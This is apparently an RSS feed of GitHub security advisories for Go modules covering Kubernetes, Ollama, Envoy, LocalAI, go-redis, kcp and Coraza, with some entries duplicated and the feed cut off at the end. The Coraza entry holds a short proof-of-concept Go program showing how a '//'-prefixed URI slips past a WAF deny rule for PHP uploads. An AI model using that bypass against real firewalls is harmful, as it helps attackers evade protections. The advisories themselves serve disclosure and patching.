<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-03-21T19:01:21.128Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes/cmd/kube-apiserver] Kubernetes kube-apiserver Vulnerable to Race Condition]]></title>
        <id>https://github.com/advisories/GHSA-r56h-j38w-hrqq</id>
        <link href="https://github.com/advisories/GHSA-r56h-j38w-hrqq"/>
        <updated>2025-03-21T17:44:12.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a malicious or compromised pod could bypass network restrictions enforced by network policies during namespace deletion. The order in which objects are deleted during namespace termination is not defined, and it is possible for network policies to be deleted before the pods that they protect. This can lead to a brief period in which the pods are running, but network policies that should apply to connections to and from the pods are not enforced.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7598">https://nvd.nist.gov/vuln/detail/CVE-2024-7598</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/126587">https://github.com/kubernetes/kubernetes/issues/126587</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/67D7UFqiPRc">https://groups.google.com/g/kubernetes-security-announce/c/67D7UFqiPRc</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/03/20/2">http://www.openwall.com/lists/oss-security/2025/03/20/2</a></li>
<li><a href="https://github.com/advisories/GHSA-r56h-j38w-hrqq">https://github.com/advisories/GHSA-r56h-j38w-hrqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r56h-j38w-hrqq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-20T18:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ollama/ollama] Ollama Vulnerable to Denial of Service (DoS) via Crafted GZIP]]></title>
        <id>https://github.com/advisories/GHSA-v464-r2r9-www7</id>
        <link href="https://github.com/advisories/GHSA-v464-r2r9-www7"/>
        <updated>2025-03-21T17:25:07.000Z</updated>
        <content type="html"><![CDATA[<p>An Out-Of-Memory (OOM) vulnerability exists in the <code>ollama</code> server version 0.3.14. This vulnerability can be triggered when a malicious API server responds with a gzip bomb HTTP response, leading to the <code>ollama</code> server crashing. The vulnerability is present in the <code>makeRequestWithRetry</code> and <code>getAuthorizationToken</code> functions, which use <code>io.ReadAll</code> to read the response body. This can result in excessive memory usage and a Denial of Service (DoS) condition.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-12886">https://nvd.nist.gov/vuln/detail/CVE-2024-12886</a></li>
<li><a href="https://huntr.com/bounties/f115fe52-58af-4844-ad29-b1c25f7245df">https://huntr.com/bounties/f115fe52-58af-4844-ad29-b1c25f7245df</a></li>
<li><a href="https://github.com/advisories/GHSA-v464-r2r9-www7">https://github.com/advisories/GHSA-v464-r2r9-www7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v464-r2r9-www7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-03-20T12:32:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy crashes when HTTP ext_proc processes local replies]]></title>
        <id>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</id>
        <link href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9"/>
        <updated>2025-03-21T15:43:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Envoy's ext_proc HTTP filter is at risk of crashing if a local reply is sent to the external server due to the filter's life time issue. A known situation is the fail of a websocket handshake will trigger a local reply leading to the crash of Envoy.</p>
<h3 id="poc">PoC</h3>
<p>If both websocket and ext_proc are enabled, a failed handshake will trigger a local reply, thus ext_proc will crash.</p>
<h3 id="mitigation">Mitigation</h3>
<ol>
<li>Disable websocket traffic</li>
<li>Change the websocket response from backend to always return <code>101 Switch protocol</code> based on RFC.</li>
<li>Apply the patch and the ext_proc filter will not send the local reply that is generated by Envoy to the ext_proc server for processing.</li>
<li>Apply the patch that the router will cancel the upstream requests when sending a local reply.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Denial of service</p>
<h3 id="reporter">Reporter</h3>
<p>Vasilios Syrakis
Fernando Cainelli</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30157">https://nvd.nist.gov/vuln/detail/CVE-2025-30157</a></li>
<li><a href="https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c">https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c</a></li>
<li><a href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-21T15:23:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy crashes when HTTP ext_proc processes local replies]]></title>
        <id>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</id>
        <link href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9"/>
        <updated>2025-03-21T15:43:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Envoy's ext_proc HTTP filter is at risk of crashing if a local reply is sent to the external server due to the filter's life time issue. A known situation is the fail of a websocket handshake will trigger a local reply leading to the crash of Envoy.</p>
<h3 id="poc">PoC</h3>
<p>If both websocket and ext_proc are enabled, a failed handshake will trigger a local reply, thus ext_proc will crash.</p>
<h3 id="mitigation">Mitigation</h3>
<ol>
<li>Disable websocket traffic</li>
<li>Change the websocket response from backend to always return <code>101 Switch protocol</code> based on RFC.</li>
<li>Apply the patch and the ext_proc filter will not send the local reply that is generated by Envoy to the ext_proc server for processing.</li>
<li>Apply the patch that the router will cancel the upstream requests when sending a local reply.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Denial of service</p>
<h3 id="reporter">Reporter</h3>
<p>Vasilios Syrakis
Fernando Cainelli</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30157">https://nvd.nist.gov/vuln/detail/CVE-2025-30157</a></li>
<li><a href="https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c">https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c</a></li>
<li><a href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-21T15:23:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy crashes when HTTP ext_proc processes local replies]]></title>
        <id>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</id>
        <link href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9"/>
        <updated>2025-03-21T15:43:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Envoy's ext_proc HTTP filter is at risk of crashing if a local reply is sent to the external server due to the filter's life time issue. A known situation is the fail of a websocket handshake will trigger a local reply leading to the crash of Envoy.</p>
<h3 id="poc">PoC</h3>
<p>If both websocket and ext_proc are enabled, a failed handshake will trigger a local reply, thus ext_proc will crash.</p>
<h3 id="mitigation">Mitigation</h3>
<ol>
<li>Disable websocket traffic</li>
<li>Change the websocket response from backend to always return <code>101 Switch protocol</code> based on RFC.</li>
<li>Apply the patch and the ext_proc filter will not send the local reply that is generated by Envoy to the ext_proc server for processing.</li>
<li>Apply the patch that the router will cancel the upstream requests when sending a local reply.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Denial of service</p>
<h3 id="reporter">Reporter</h3>
<p>Vasilios Syrakis
Fernando Cainelli</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30157">https://nvd.nist.gov/vuln/detail/CVE-2025-30157</a></li>
<li><a href="https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c">https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c</a></li>
<li><a href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-21T15:23:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/envoyproxy/envoy] Envoy crashes when HTTP ext_proc processes local replies]]></title>
        <id>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</id>
        <link href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9"/>
        <updated>2025-03-21T15:43:02.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Envoy's ext_proc HTTP filter is at risk of crashing if a local reply is sent to the external server due to the filter's life time issue. A known situation is the fail of a websocket handshake will trigger a local reply leading to the crash of Envoy.</p>
<h3 id="poc">PoC</h3>
<p>If both websocket and ext_proc are enabled, a failed handshake will trigger a local reply, thus ext_proc will crash.</p>
<h3 id="mitigation">Mitigation</h3>
<ol>
<li>Disable websocket traffic</li>
<li>Change the websocket response from backend to always return <code>101 Switch protocol</code> based on RFC.</li>
<li>Apply the patch and the ext_proc filter will not send the local reply that is generated by Envoy to the ext_proc server for processing.</li>
<li>Apply the patch that the router will cancel the upstream requests when sending a local reply.</li>
</ol>
<h3 id="impact">Impact</h3>
<p>Denial of service</p>
<h3 id="reporter">Reporter</h3>
<p>Vasilios Syrakis
Fernando Cainelli</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/envoyproxy/envoy/security/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30157">https://nvd.nist.gov/vuln/detail/CVE-2025-30157</a></li>
<li><a href="https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c">https://github.com/envoyproxy/envoy/commit/8eda1b8ef5ba8663d16a737ab99458c039a9b53c</a></li>
<li><a href="https://github.com/advisories/GHSA-cf3q-gqg7-3fm9">https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf3q-gqg7-3fm9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-21T15:23:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mudler/LocalAI] LocalAI Cross-Site Scripting (XSS) vulnerability in its search functionality]]></title>
        <id>https://github.com/advisories/GHSA-w6hh-w36c-vxmw</id>
        <link href="https://github.com/advisories/GHSA-w6hh-w36c-vxmw"/>
        <updated>2025-03-21T03:39:11.000Z</updated>
        <content type="html"><![CDATA[<p>mudler/localai version v2.21.1 contains a Cross-Site Scripting (XSS) vulnerability in its search functionality. The vulnerability arises due to improper sanitization of user input, allowing the injection and execution of arbitrary JavaScript code. This can lead to the execution of malicious scripts in the context of the victim's browser, potentially compromising user sessions, stealing session cookies, redirecting users to malicious websites, or manipulating the DOM.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9900">https://nvd.nist.gov/vuln/detail/CVE-2024-9900</a></li>
<li><a href="https://github.com/mudler/localai/commit/a1634b219a4e52813e70ff07e6376a01449c4515">https://github.com/mudler/localai/commit/a1634b219a4e52813e70ff07e6376a01449c4515</a></li>
<li><a href="https://huntr.com/bounties/b39cd230-db66-471b-89b9-24afaa078e68">https://huntr.com/bounties/b39cd230-db66-471b-89b9-24afaa078e68</a></li>
<li><a href="https://github.com/advisories/GHSA-w6hh-w36c-vxmw">https://github.com/advisories/GHSA-w6hh-w36c-vxmw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w6hh-w36c-vxmw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-20T12:32:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redis/go-redis/v9] go-redis allows potential out of order responses when `CLIENT SETINFO` times out during connection establishment]]></title>
        <id>https://github.com/advisories/GHSA-92cp-5422-2mw7</id>
        <link href="https://github.com/advisories/GHSA-92cp-5422-2mw7"/>
        <updated>2025-03-20T18:50:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The issue only occurs when the <code>CLIENT SETINFO</code> command times out during connection establishment. The following circumstances can cause such a timeout:</p>
<ol>
<li>The client is configured to transmit its identity. This can be disabled via the <code>DisableIndentity</code> flag.</li>
<li>There are network connectivity issues</li>
<li>The client was configured with aggressive timeouts</li>
</ol>
<p>The impact differs by use case:</p>
<ul>
<li><strong>Sticky connections</strong>: Rather than using a connection from the pool on-demand, the caller can stick with a connection. Then you receive persistent out-of-order responses for the lifetime of the connection.</li>
<li><strong>Pipelines</strong>: All commands in the pipeline receive incorrect responses.</li>
<li><strong>Default connection pool usage without pipelining</strong>: When used with the default <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L77">ConnPool</a> once a connection is returned after use with <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L366">ConnPool#Put</a> the read buffer will be checked and the connection will be marked as bad due to the unread data. This means that at most one out-of-order response before the connection is discarded.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>We prepared a fix in <a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a> and plan to release patch versions soon.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can prevent the vulnerability by setting the flag <code>DisableIndentity</code> (BTW: We also need to fix the spelling.) to <code>true</code> when constructing the client instance.</p>
<h3 id="credit">Credit</h3>
<p>Akhass Wasti
Ramin Ghorashi
Anton Amlinger
Syed Rahman
Mahesh Venkateswaran
Sergey Zavoloka
Aditya Adarwal
Abdulla Anam
Abd-Alhameed
Alex Vanlint
Gaurav Choudhary
Vedanta Jha
Yll Kelani
Ryan Picard</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7">https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29923">https://nvd.nist.gov/vuln/detail/CVE-2025-29923</a></li>
<li><a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a></li>
<li><a href="https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6">https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6</a></li>
<li><a href="https://github.com/advisories/GHSA-92cp-5422-2mw7">https://github.com/advisories/GHSA-92cp-5422-2mw7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92cp-5422-2mw7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-20T18:49:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redis/go-redis/v9] go-redis allows potential out of order responses when `CLIENT SETINFO` times out during connection establishment]]></title>
        <id>https://github.com/advisories/GHSA-92cp-5422-2mw7</id>
        <link href="https://github.com/advisories/GHSA-92cp-5422-2mw7"/>
        <updated>2025-03-20T18:50:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The issue only occurs when the <code>CLIENT SETINFO</code> command times out during connection establishment. The following circumstances can cause such a timeout:</p>
<ol>
<li>The client is configured to transmit its identity. This can be disabled via the <code>DisableIndentity</code> flag.</li>
<li>There are network connectivity issues</li>
<li>The client was configured with aggressive timeouts</li>
</ol>
<p>The impact differs by use case:</p>
<ul>
<li><strong>Sticky connections</strong>: Rather than using a connection from the pool on-demand, the caller can stick with a connection. Then you receive persistent out-of-order responses for the lifetime of the connection.</li>
<li><strong>Pipelines</strong>: All commands in the pipeline receive incorrect responses.</li>
<li><strong>Default connection pool usage without pipelining</strong>: When used with the default <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L77">ConnPool</a> once a connection is returned after use with <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L366">ConnPool#Put</a> the read buffer will be checked and the connection will be marked as bad due to the unread data. This means that at most one out-of-order response before the connection is discarded.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>We prepared a fix in <a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a> and plan to release patch versions soon.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can prevent the vulnerability by setting the flag <code>DisableIndentity</code> (BTW: We also need to fix the spelling.) to <code>true</code> when constructing the client instance.</p>
<h3 id="credit">Credit</h3>
<p>Akhass Wasti
Ramin Ghorashi
Anton Amlinger
Syed Rahman
Mahesh Venkateswaran
Sergey Zavoloka
Aditya Adarwal
Abdulla Anam
Abd-Alhameed
Alex Vanlint
Gaurav Choudhary
Vedanta Jha
Yll Kelani
Ryan Picard</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7">https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29923">https://nvd.nist.gov/vuln/detail/CVE-2025-29923</a></li>
<li><a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a></li>
<li><a href="https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6">https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6</a></li>
<li><a href="https://github.com/advisories/GHSA-92cp-5422-2mw7">https://github.com/advisories/GHSA-92cp-5422-2mw7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92cp-5422-2mw7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-20T18:49:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redis/go-redis/v9] go-redis allows potential out of order responses when `CLIENT SETINFO` times out during connection establishment]]></title>
        <id>https://github.com/advisories/GHSA-92cp-5422-2mw7</id>
        <link href="https://github.com/advisories/GHSA-92cp-5422-2mw7"/>
        <updated>2025-03-20T18:50:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The issue only occurs when the <code>CLIENT SETINFO</code> command times out during connection establishment. The following circumstances can cause such a timeout:</p>
<ol>
<li>The client is configured to transmit its identity. This can be disabled via the <code>DisableIndentity</code> flag.</li>
<li>There are network connectivity issues</li>
<li>The client was configured with aggressive timeouts</li>
</ol>
<p>The impact differs by use case:</p>
<ul>
<li><strong>Sticky connections</strong>: Rather than using a connection from the pool on-demand, the caller can stick with a connection. Then you receive persistent out-of-order responses for the lifetime of the connection.</li>
<li><strong>Pipelines</strong>: All commands in the pipeline receive incorrect responses.</li>
<li><strong>Default connection pool usage without pipelining</strong>: When used with the default <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L77">ConnPool</a> once a connection is returned after use with <a href="https://github.com/redis/go-redis/blob/8fadbef84a3f4e7573f8b38e5023fd469470a8a4/internal/pool/pool.go#L366">ConnPool#Put</a> the read buffer will be checked and the connection will be marked as bad due to the unread data. This means that at most one out-of-order response before the connection is discarded.</li>
</ul>
<h3 id="patches">Patches</h3>
<p>We prepared a fix in <a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a> and plan to release patch versions soon.</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can prevent the vulnerability by setting the flag <code>DisableIndentity</code> (BTW: We also need to fix the spelling.) to <code>true</code> when constructing the client instance.</p>
<h3 id="credit">Credit</h3>
<p>Akhass Wasti
Ramin Ghorashi
Anton Amlinger
Syed Rahman
Mahesh Venkateswaran
Sergey Zavoloka
Aditya Adarwal
Abdulla Anam
Abd-Alhameed
Alex Vanlint
Gaurav Choudhary
Vedanta Jha
Yll Kelani
Ryan Picard</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7">https://github.com/redis/go-redis/security/advisories/GHSA-92cp-5422-2mw7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29923">https://nvd.nist.gov/vuln/detail/CVE-2025-29923</a></li>
<li><a href="https://github.com/redis/go-redis/pull/3295">https://github.com/redis/go-redis/pull/3295</a></li>
<li><a href="https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6">https://github.com/redis/go-redis/commit/d236865b0cfa1b752ea4b7da666b1fdcd0acebb6</a></li>
<li><a href="https://github.com/advisories/GHSA-92cp-5422-2mw7">https://github.com/advisories/GHSA-92cp-5422-2mw7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-92cp-5422-2mw7</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-20T18:49:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/kcp-dev/kcp] kcp allows unauthorized creation and deletion of objects in arbitrary workspaces through APIExport Virtual Workspace]]></title>
        <id>https://github.com/advisories/GHSA-w2rr-38wv-8rrp</id>
        <link href="https://github.com/advisories/GHSA-w2rr-38wv-8rrp"/>
        <updated>2025-03-20T18:49:08.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>APIExport</code> Virtual Workspace can be used to manage objects in workspaces that bind that <code>APIExport</code> for resources defined in the <code>APIExport</code> or specified and accepted via permission claims. This allows an API provider (via their <code>APIExport</code>) scoped down access to workspaces of API consumers to provide their services properly.</p>
<p>The identified vulnerability allows creating or deleting an object via the <code>APIExport</code> VirtualWorkspace in any arbitrary target workspace for pre-existing resources. By design, this should only be allowed when the workspace owner decides to give access to an API provider by creating an APIBinding.</p>
<p>With this vulnerability, it is possible for an attacker to create and delete objects even if none of these requirements are satisfied, i.e. even if there is no APIBinding in that workspace at all or the workspace owner has created an APIBinding, but rejected a permission claim.</p>
<h3 id="patches">Patches</h3>
<p>A fix for this issue has been identified and has been published with kcp 0.26.3 and 0.27.0.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For users unable to upgrade to one of the patched versions, the following guidance can be given:</p>
<ul>
<li>Minimise the set of people with <code>apiexport/content</code> sub-resource access to <code>APIExport</code> resources. Be aware that this has to apply to all workspaces to be effective.</li>
<li>Filter incoming requests in a reverse proxy with a similar logic as the authorizer added in the referenced pull request.</li>
</ul>
<h3 id="references">References</h3>
<p>See pull request (<a href="https://github.com/kcp-dev/kcp/pull/3338">https://github.com/kcp-dev/kcp/pull/3338</a>).</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/kcp-dev/kcp/security/advisories/GHSA-w2rr-38wv-8rrp">https://github.com/kcp-dev/kcp/security/advisories/GHSA-w2rr-38wv-8rrp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29922">https://nvd.nist.gov/vuln/detail/CVE-2025-29922</a></li>
<li><a href="https://github.com/kcp-dev/kcp/pull/3338">https://github.com/kcp-dev/kcp/pull/3338</a></li>
<li><a href="https://github.com/kcp-dev/kcp/commit/614ecbf35f11db00f65391ab6fbb1547ca8b5d38">https://github.com/kcp-dev/kcp/commit/614ecbf35f11db00f65391ab6fbb1547ca8b5d38</a></li>
<li><a href="https://github.com/advisories/GHSA-w2rr-38wv-8rrp">https://github.com/advisories/GHSA-w2rr-38wv-8rrp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w2rr-38wv-8rrp</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2025-03-20T18:49:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/corazawaf/coraza/v3] OWASP Coraza WAF has parser confusion which leads to wrong URI in `REQUEST_FILENAME`]]></title>
        <id>https://github.com/advisories/GHSA-q9f5-625g-xm39</id>
        <link href="https://github.com/advisories/GHSA-q9f5-625g-xm39"/>
        <updated>2025-03-20T18:48:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>URLs starting with <code>//</code> are not parsed properly, and the request <code>REQUEST_FILENAME</code> variable contains a wrong value, leading to potential rules bypass.</p>
<h3 id="details">Details</h3>
<p>If a request is made on an URI starting with <code>//</code>, coraza will set a wrong value in <code>REQUEST_FILENAME</code>.
For example, if the URI <code>//bar/uploads/foo.php?a=b</code> is passed to coraza: , <code>REQUEST_FILENAME</code> will be set to <code>/uploads/foo.php</code>.</p>
<p>The root cause is the usage of <code>url.Parse</code> to parse the URI in <a href="https://github.com/corazawaf/coraza/blob/8b612f4e6e18c606e371110227bc7669dc714cab/internal/corazawaf/transaction.go#L768">ProcessURI</a>.</p>
<p><code>url.Parse</code> can parse both absolute URLs (starting with a scheme) or relative ones (just the path). 
<code>//bar/uploads/foo.php</code> is a valid absolute URI (the scheme is empty), <code>url.Parse</code> will consider <code>bar</code> as the host and the path will be set to <code>/uploads/foo.php</code>.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-go">package main

import (
    "fmt"
    "net/url"
    "os"

    "github.com/corazawaf/coraza/v3"
)

const testRule = `
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRule REQUEST_FILENAME "@rx /bar/uploads/.*\.(h?ph(p|tm?l?|ar)|module|shtml)" "id:1,phase:1,deny"
`

func main() {
    var testURL = "//bar/uploads/foo.php"

    if os.Getenv("TEST_URL") != "" {
        testURL = os.Getenv("TEST_URL")
    }

    fmt.Printf("Testing URL: %s\n", testURL)

    config := coraza.NewWAFConfig().WithDirectives(testRule)

    waf, err := coraza.NewWAF(config)

    if err != nil {
        panic(err)
    }

    tx := waf.NewTransaction()

    tx.ProcessURI(testURL, "GET", "HTTP/1.1")

    in := tx.ProcessRequestHeaders()

    if in != nil {
        fmt.Printf("%+v\n", in)
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Potential bypass of rules using <code>REQUEST_FILENAME</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/corazawaf/coraza/security/advisories/GHSA-q9f5-625g-xm39">https://github.com/corazawaf/coraza/security/advisories/GHSA-q9f5-625g-xm39</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-29914">https://nvd.nist.gov/vuln/detail/CVE-2025-29914</a></li>
<li><a href="https://github.com/corazawaf/coraza/commit/4722c9ad0d502abd56b8d6733c6b47eb4111742d">https://github.com/corazawaf/coraza/commit/4722c9ad0d502abd56b8d6733c6b47eb4111742d</a></li>
<li><a href="https://github.com/advisories/GHSA-q9f5-625g-xm39">https://github.com/advisories/GHSA-q9f5-625g-xm39</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9f5-625g-xm39</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-03-20T18:48:38.000Z</published>
    </entry>
    <entry>
